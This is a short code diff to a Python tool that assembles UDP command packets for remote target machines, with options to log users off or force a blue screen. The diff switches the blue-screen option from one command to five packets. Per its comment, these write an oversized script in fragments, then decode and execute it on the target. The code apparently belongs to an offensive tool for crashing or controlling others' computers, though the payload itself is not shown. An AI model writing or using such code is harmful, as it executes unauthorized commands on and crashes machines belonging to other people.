@@ -1,7 +1,8 @@
 """发送参数校验、报文组装与结果汇总。"""
 
+from app.packets.blue_screen import blue_screen_packets
 from app.packets.codec import pkg_sendlist, split_message
-from app.packets.constants import BLUE_SCREEN_COMMAND, LOGOFF_COMMAND, basicCMD
+from app.packets.constants import LOGOFF_COMMAND, basicCMD
 from app.system.net.targets import count_targets, get_ip
 from app.system.net.udp import send_tracked
 
@@ -52,7 +53,8 @@ def prepare_packets(options, report=None):
     elif options.extra == "l":
         packets.append(pkg_sendlist("-c", LOGOFF_COMMAND))
     elif options.extra == "b":
-        packets.append(pkg_sendlist("-c", BLUE_SCREEN_COMMAND))
+        # 蓝屏脚本超过单条命令上限，按分片写入再解码执行，共五条报文。
+        packets.extend(blue_screen_packets())
     return packets
 
 
